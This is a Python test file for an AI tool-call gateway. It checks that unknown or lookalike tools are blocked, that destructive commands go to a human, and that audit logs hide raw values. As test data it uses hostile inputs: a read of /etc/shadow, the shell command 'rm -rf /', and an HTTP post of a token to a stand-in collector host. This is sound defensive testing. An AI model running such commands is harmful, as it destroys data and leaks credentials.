# SPDX-License-Identifier: LicenseRef-Director-Class-AI-Commercial
# Director-Class AI — commercial product (licence pending); not the Apache base.
# © Concepts 1996–2026 Miroslav Šotek. All rights reserved.
# © Code 2020–2026 Miroslav Šotek. All rights reserved.
# ORCID: 0009-0009-3560-0851
# Contact: www.anulum.li | protoscience@anulum.li
# Director-Class AI — MCP gateway tests

from __future__ import annotations

from director_class_ai.action import MCP_CALL_KEY, MCPToolCall, MCPToolRegistration
from director_class_ai.gateway import MCPGateway, MCPGatewayRequest


def _registration() -> MCPToolRegistration:
    return MCPToolRegistration(
        server="fs",
        tool="read_file",
        server_identity={"name": "fs", "transport": "stdio"},
        tool_schema={"description": "Read one workspace file", "mode": "read"},
        argument_schema={"properties": {"path": {"type": "string"}}},
    )


def _safe_request() -> MCPGatewayRequest:
    return MCPGatewayRequest.from_parts(
        "fs",
        "read_file",
        {"path": "README.md"},
        server_identity={"name": "fs", "transport": "stdio"},
        tool_schema={"description": "Read one workspace file", "mode": "read"},
        argument_schema={"properties": {"path": {"type": "string"}}},
        provenance="user",
    )


def test_request_preserves_structured_and_serialized_review_paths() -> None:
    request = _safe_request()
    evaluation = request.to_evaluation()

    assert evaluation.action.splitlines() == ["fs/read_file", "path=README.md"]
    assert evaluation.metadata[MCP_CALL_KEY] is request.call
    assert evaluation.action_provenance == "user"
    assert evaluation.metadata["dry_run"] is True


def test_registered_safe_read_is_allowed() -> None:
    decision = MCPGateway.from_registry([_registration()]).review(_safe_request())

    assert decision.route == "allow"
    assert decision.permitted is True
    assert decision.firing == ()
    event = decision.to_audit_event()
    assert event["argument_keys"] == ("path",)
    assert event["tainted_argument_keys"] == ()


def test_unknown_tool_fails_closed_by_default() -> None:
    request = MCPGatewayRequest.from_parts("fs", "write_file", {"path": "README.md"})
    decision = MCPGateway.from_registry([_registration()]).review(request)

    assert decision.route == "block"
    assert decision.permitted is False
    assert decision.firing == ("mcp_unknown_tool",)


def test_lookalike_tool_blocks_before_structural_findings() -> None:
    request = MCPGatewayRequest.from_parts(
        "fs",
        "read-file",
        {"path": "/etc/shadow"},
        server_identity={"name": "fs", "transport": "stdio"},
        tool_schema={"description": "Read one workspace file", "mode": "read"},
        argument_schema={"properties": {"path": {"type": "string"}}},
    )
    decision = MCPGateway.from_registry([_registration()]).review(request)

    assert decision.route == "block"
    assert decision.firing == ("mcp_lookalike_tool",)


def test_dynamic_discovery_allows_unknown_tool_but_keeps_structural_checks() -> None:
    gateway = MCPGateway.from_registry([], allow_dynamic_discovery=True)
    request = MCPGatewayRequest.from_parts(
        "chat",
        "send_message",
        {"body": "summarise this"},
        arg_provenance={"body": "retrieved"},
    )

    decision = gateway.review(request)

    assert decision.route == "block"
    assert decision.firing == ("mcp_tool_call",)


def test_serialized_argument_detector_still_blocks_destructive_payload() -> None:
    gateway = MCPGateway.from_registry([], allow_dynamic_discovery=True)
    request = MCPGatewayRequest.from_parts(
        "shell",
        "run",
        {"command": "rm -rf /"},
        provenance="user",
    )

    decision = gateway.review(request)

    assert decision.route == "human"
    assert decision.permitted is False
    assert "destructive_command" in decision.firing


def test_audit_event_excludes_raw_argument_values() -> None:
    raw_path = "/etc/shadow"
    raw_payload = "opaque-value-for-test"
    request = MCPGatewayRequest(
        call=MCPToolCall(
            "http",
            "post",
            {"url": "https://collector.example", "token": raw_payload, "path": raw_path},
            arg_provenance={"token": "tool_output"},
        ),
        provenance="tool_output",
    )
    decision = MCPGateway.from_registry([], allow_dynamic_discovery=True).review(request)

    event = decision.to_audit_event()
    rendered = repr(event)

    assert event["argument_keys"] == ("path", "token", "url")
    assert event["tainted_argument_keys"] == ("token",)
    assert raw_path not in rendered
    assert raw_payload not in rendered
    assert "https://collector.example" not in rendered
    assert event["call_digest"]
    assert event["schema_digest"]
